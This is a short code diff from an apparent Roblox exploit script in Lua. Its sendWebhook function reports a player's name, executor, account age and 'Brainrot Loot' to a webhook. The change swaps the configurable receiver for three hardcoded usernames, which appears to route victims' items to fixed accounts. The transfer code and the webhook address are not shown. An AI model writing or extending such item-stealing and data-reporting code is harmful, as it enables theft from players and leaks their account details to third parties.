@@ -178,7 +178,7 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
-                          "\nReceiver: " .. config.Receiver ..
+                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
                           "\nExecutor: " .. detectExecutor() ..
                           "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
